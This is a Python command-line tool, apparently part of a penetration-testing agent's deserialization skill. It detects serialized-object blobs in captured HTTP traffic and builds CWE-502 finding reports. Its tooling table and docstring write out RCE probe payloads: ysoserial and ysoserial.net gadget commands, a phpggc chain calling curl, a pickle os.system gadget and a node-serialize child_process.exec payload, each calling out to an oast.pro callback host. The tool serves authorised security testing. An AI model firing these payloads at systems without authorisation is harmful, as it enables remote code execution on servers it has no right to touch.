#!/usr/bin/env python3
"""detect_serialized.py — serialized-object sink finder / finding builder
for the deserialization-testing skill.

Subcommands
  scan    Scan captured HTTP requests/responses, cookie jars, URL lists, or any
          text dump for serialized-object blobs (Java / .NET / PHP / Python
          pickle / Ruby Marshal / node-serialize), including URL-decoded,
          base64 (std + urlsafe) and gzip-nested encodings. Classifies each
          hit, attributes it to its seat (cookie/param/header/body), suggests
          the attack tool + first probe, and emits a rupu work-units JSON
          array (--work-units, first char '[') for fan-out via the
          `work-units` skill.
  report  Turn a confirmed RCE/callback into a findings.report payload
          (scope endpoint, WSTG-INPV-19 / CWE-502) for the `finding-report`
          skill.

Examples
  python3 scripts/detect_serialized.py scan -i req1.txt -i history.txt \
      --work-units deser-units.json
  cat urls.txt | python3 scripts/detect_serialized.py scan --work-units u.json
  python3 scripts/detect_serialized.py report --url https://example.com/account \
      --location cookie:session --format java-serialized \
      --tool "ysoserial CommonsCollections6" \
      --payload-cmd "java -jar ysoserial.jar CommonsCollections6 'nslookup cc6-x.oast.pro' | base64 -w0" \
      --request-file delivery.txt --response-file oast-hit.json -o finding.json
"""

import argparse
import base64
import binascii
import gzip
import json
import re
import sys
import urllib.parse

# ---------------------------------------------------------------- classification

TOOLING = {
    "java-serialized": {
        "suggested_tool": "ysoserial",
        "first_probe": "java -jar ysoserial.jar URLDNS 'http://java-<id>.oast.pro/' | base64 -w0",
        "gadget_order": "URLDNS,CommonsCollections6,CommonsCollections5,"
                        "CommonsBeanutils1,CommonsCollections2,Spring1,ROME,Groovy1",
        "reference": "java.md",
    },
    "dotnet-binaryformatter": {
        "suggested_tool": "ysoserial.net",
        "first_probe": "ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -o base64 "
                       "-c \"nslookup net-<id>.oast.pro\"",
        "reference": "dotnet-php-python.md",
    },
    "dotnet-viewstate": {
        "suggested_tool": "ysoserial.net -p ViewState",
        "first_probe": "byte-flip for MAC oracle; then ysoserial.exe -p ViewState "
                       "-g TextFormattingRunProperties --validationalg=SHA1 "
                       "--validationkey=<machineKey> --generator=<__VIEWSTATEGENERATOR> "
                       "-c \"nslookup vs-<id>.oast.pro\"",
        "reference": "dotnet-php-python.md",
    },
    "php-serialized": {
        "suggested_tool": "phpggc",
        "first_probe": "phpggc -b -f Monolog/RCE1 system 'curl http://php-<id>.oast.pro'",
        "reference": "dotnet-php-python.md",
    },
    "python-pickle": {
        "suggested_tool": "pickle __reduce__ gadget",
        "first_probe": "pickle.dumps of class with __reduce__ -> (os.system, "
                       "('nslookup py-<id>.oast.pro',)), re-encode like original",
        "reference": "dotnet-php-python.md",
    },
    "ruby-marshal": {
        "suggested_tool": "ruby Marshal universal gadget (Gem::Requirement chain)",
        "first_probe": "parse-oracle byte flip; forge with leaked secret_key_base",
        "reference": "dotnet-php-python.md",
    },
    "node-serialize": {
        "suggested_tool": "node-serialize $$ND_FUNC$$ IIFE",
        "first_probe": "{\"x\":\"_$$ND_FUNC$$_function(){require('child_process')"
                       ".exec('nslookup js-<id>.oast.pro')}()\"}",
        "reference": "detection.md",
    },
}

PHP_RE = re.compile(r'(?:^|[;{])\s*(?:O:\d+:"[^"]+":\d+:\{|a:\d+:\{|s:\d+:")')


def magic_format(data, name_hint=""):
    """Classify raw bytes; return format string or None."""
    if data.startswith(b"\xac\xed\x00\x05"):
        return "java-serialized"
    if data.startswith(b"\x00\x01\x00\x00\x00\xff\xff\xff\xff"):
        return "dotnet-binaryformatter"
    if data[:1] == b"\x80" and data[1:2] in b"\x02\x03\x04\x05":
        return "python-pickle"
    if data.startswith(b"(dp") or data.startswith(b"(lp"):
        return "python-pickle"
    if data.startswith(b"\x04\x08"):
        return "ruby-marshal"
    text = data.decode("latin-1", "replace")
    if "$$ND_FUNC$$" in text:
        return "node-serialize"
    if PHP_RE.search(text):
        return "php-serialized"
    if "viewstate" in name_hint.lower() and text[:3] in ("/wE",):
        return "dotnet-viewstate"
    return None


def b64_variants(s):
    """Yield plausible base64 decodings (std + urlsafe, padded)."""
    s = s.strip()
    if len(s) < 8 or not re.fullmatch(r"[A-Za-z0-9+/_\-=]+", s):
        return
    pad = s + "=" * (-len(s) % 4)
    for fn in (base64.b64decode, base64.urlsafe_b64decode):
        try:
            d = fn(pad)
            if d:
                yield d
        except (binascii.Error, ValueError):
            continue


def classify(value, name_hint=""):
    """Try layered decodings; return (format, encoding_chain) or (None, None).
    Layers: raw -> urldecode -> base64 -> gzip, breadth-first, depth <= 4."""
    seen = set()
    queue = [(value.encode("latin-1", "replace") if isinstance(value, str) else value, [])]
    depth = 0
    while queue and depth < 64:
        depth += 1
        data, chain = queue.pop(0)
        key = data[:64]
        if key in seen:
            continue
        seen.add(key)
        fmt = magic_format(data, name_hint)
        if fmt:
            return fmt, chain or ["raw"]
        if len(chain) >= 4:
            continue
        text = data.decode("latin-1", "replace")
        if "%" in text:
            uq = urllib.parse.unquote(text)
            if uq != text:
                queue.append((uq.encode("latin-1", "replace"), chain + ["urldecode"]))
        if data[:2] == b"\x1f\x8b":
            try:
                queue.append((gzip.decompress(data), chain + ["gzip"]))
            except OSError:
                pass
        for dec in b64_variants(text):
            queue.append((dec, chain + ["base64"]))
        # JWT: rescan each segment
        if text.count(".") == 2 and text.startswith("eyJ"):
            for seg in text.split("."):
                for dec in b64_variants(seg):
                    queue.append((dec, chain + ["jwt-segment"]))
    # ViewState prefix even without name hint
    if isinstance(value, str) and value[:3] == "/wE":
        return "dotnet-viewstate", ["raw"]
    return None, None


# ---------------------------------------------------------------- extraction

REQ_LINE = re.compile(r"^(GET|POST|PUT|PATCH|DELETE|HEAD|OPTIONS)\s+(\S+)\s+HTTP/", re.M)
HOST_LINE = re.compile(r"^Host:\s*(\S+)", re.M | re.I)
URL_RE = re.compile(r"https?://[^\s\"'<>]+")
COOKIE_LINE = re.compile(r"^(?:Set-)?Cookie2?:\s*(.+)$", re.M | re.I)
HEADER_LINE = re.compile(r"^([A-Za-z0-9\-]+):\s*(.+)$", re.M)
PAIR_RE = re.compile(r"([A-Za-z0-9_\-\.\[\]%]+)=([^&;\s\"'<>]+)")
BARE_BLOB = re.compile(r"\b(rO0AB[\w+/=]+|AAEAAAD[\w+/=]+|H4sIA[\w+/=]+|gA[JNR][\w+/=]+|"
                       r"gASV[\w+/=]+|BAh[\w+/=]+|/wE[\w+/=]+|O:\d+:\"[^\"]+\":\d+:\{\S*)")
SKIP_HEADERS = {"host", "content-length", "connection", "accept", "accept-encoding",
                "accept-language", "content-type", "user-agent", "referer", "origin"}


def base_url(text):
    """Reconstruct the request URL from a raw request, else first URL in file."""
    m = REQ_LINE.search(text)
    h = HOST_LINE.search(text)
    if m and h:
        path = m.group(2)
        if path.startswith("http"):
            return path.split("?")[0]
        return "https://" + h.group(1) + path.split("?")[0]
    u = URL_RE.search(text)
    if u:
        p = urllib.parse.urlsplit(u.group(0))
        return urllib.parse.urlunsplit((p.scheme, p.netloc, p.path, "", ""))
    return "unknown://unattributed"


def extract_candidates(text):
    """Yield (location, name, value) triples from a text dump."""
    for m in COOKIE_LINE.finditer(text):
        for part in m.group(1).split(";"):
            name, _, val = part.strip().partition("=")
            if val:
                yield "cookie", name.strip(), val.strip()
    for m in HEADER_LINE.finditer(text):
        name, val = m.group(1), m.group(2).strip()
        if name.lower() not in SKIP_HEADERS and not name.lower().startswith(("cookie", "set-cookie")):
            yield "header", name, val
    for m in URL_RE.finditer(text):
        q = urllib.parse.urlsplit(m.group(0)).query
        for k, v in urllib.parse.parse_qsl(q, keep_blank_values=False):
            yield "param", k, v
    # urlencoded bodies / loose pairs
    for m in PAIR_RE.finditer(text):
        if len(m.group(2)) >= 8:
            yield "param", m.group(1), m.group(2)
    for m in BARE_BLOB.finditer(text):
        yield "body", "(bare-blob)", m.group(1)


def slug(s):
    return re.sub(r"-+", "-", re.sub(r"[^a-z0-9]+", "-", s.lower())).strip("-")


def scan(args):
    sinks = {}
    sources = []
    if args.input:
        for path in args.input:
            with open(path, "r", errors="replace") as f:
                sources.append((path, f.read()))
    else:
        sources.append(("stdin", sys.stdin.read()))

    for src, text in sources:
        url = base_url(text)
        for loc, name, value in extract_candidates(text):
            fmt, chain = classify(value, name)
            if not fmt:
                continue
            key = (url, "%s:%s" % (loc, name), fmt)
            if key in sinks:
                continue
            sinks[key] = {
                "source": src, "url": url, "location": "%s:%s" % (loc, name),
                "format": fmt, "encoding": ">".join(chain),
                "sample_prefix": value[:48],
                **TOOLING.get(fmt, {}),
            }

    report = sorted(sinks.values(), key=lambda s: (s["url"], s["location"]))
    print(json.dumps(report, indent=2))

    if args.work_units:
        units = []
        for s in report:
            host = urllib.parse.urlsplit(s["url"]).netloc or "target"
            path = urllib.parse.urlsplit(s["url"]).path or "/"
            uid = slug("deser-%s-%s-%s-%s" % (host, path, s["location"], s["format"]))
            hints = {k: v for k, v in s.items() if k not in ("source", "url")}
            units.append({
                "id": uid,
                "title": "%s blob in %s at %s" % (s["format"], s["location"], s["url"]),
                "targets": [s["url"]],
                "hints": hints,
            })
        with open(args.work_units, "w") as f:
            json.dump(units, f, indent=2)
        sys.stderr.write("[+] %d work units -> %s (feed to the work-units skill; "
                         "mark each via coverage-assets, depth=crawled)\n"
                         % (len(units), args.work_units))
    if not report:
        sys.stderr.write("[-] no serialized-object markers found\n")


# ---------------------------------------------------------------- finding builder

def read_opt(path):
    if not path:
        return None
    with open(path, "r", errors="replace") as f:
        return f.read()


def report_cmd(args):
    req = read_opt(args.request_file) or "(attach the delivery HTTP request)"
    resp = read_opt(args.response_file) or "(attach the response / interactsh JSON hit)"
    oracle_only = args.severity == "high"
    rationale = (
        "The %s seat at %s contains a %s blob that the server deserializes. "
        % (args.location, args.url, args.format))
    if oracle_only:
        rationale += ("A single-byte corruption of the blob changed the response "
                      "(deserialization exception), proving the server parses "
                      "attacker-controlled serialized data (parse oracle); no "
                      "gadget chain has been confirmed yet.")
    else:
        rationale += ("The payload generated with %s produced the correlated "
                      "out-of-band callback / command output shown below, proving "
                      "arbitrary code execution via insecure deserialization."
                      % (args.tool or "the gadget tool"))
    if args.payload_cmd:
        rationale += " Payload generation: %s" % args.payload_cmd
    if args.rationale:
        rationale += " " + args.rationale
    finding = {
        "title": args.title or "Insecure deserialization (%s) in %s%s" % (
            args.format, args.location, "" if oracle_only else " — RCE via %s" % (args.tool or "gadget chain")),
        "scope": "endpoint",
        "target_ref": args.url,
        "severity": args.severity,
        "classification": ["WSTG-INPV-19", "CWE-502"],
        "evidence": {"rationale": rationale, "request": req, "response": resp},
    }
    out = json.dumps(finding, indent=2)
    if args.output:
        with open(args.output, "w") as f:
            f.write(out)
        sys.stderr.write("[+] findings.report payload -> %s (submit via the "
                         "finding-report skill; mark route exploited via "
                         "coverage-assets)\n" % args.output)
    else:
        print(out)


def main():
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    sub = ap.add_subparsers(dest="cmd", required=True)

    sc = sub.add_parser("scan", help="scan captured traffic for serialized blobs")
    sc.add_argument("-i", "--input", action="append",
                    help="input file (raw request, proxy export, cookie jar, URL list); "
                         "repeatable; default stdin")
    sc.add_argument("--work-units", metavar="FILE", help="write rupu work-units JSON array")
    sc.set_defaults(func=scan)

    rp = sub.add_parser("report", help="build a findings.report payload from a confirmed sink")
    rp.add_argument("--url", required=True, help="affected endpoint URL (target_ref)")
    rp.add_argument("--location", required=True, help="e.g. cookie:session / param:__VIEWSTATE")
    rp.add_argument("--format", required=True, help="e.g. java-serialized / php-serialized")
    rp.add_argument("--tool", help="tool + gadget used, e.g. 'ysoserial CommonsCollections6'")
    rp.add_argument("--payload-cmd", help="exact payload generation command line")
    rp.add_argument("--request-file", help="file with the delivery HTTP request")
    rp.add_argument("--response-file", help="file with the response / interactsh hit JSON")
    rp.add_argument("--severity", default="critical", choices=["info", "low", "medium", "high", "critical"],
                    help="critical=RCE/callback, high=parse-oracle only")
    rp.add_argument("--title", help="override finding title")
    rp.add_argument("--rationale", help="extra rationale text to append")
    rp.add_argument("-o", "--output", help="write JSON here instead of stdout")
    rp.set_defaults(func=report_cmd)

    args = ap.parse_args()
    args.func(args)


if __name__ == "__main__":
    main()
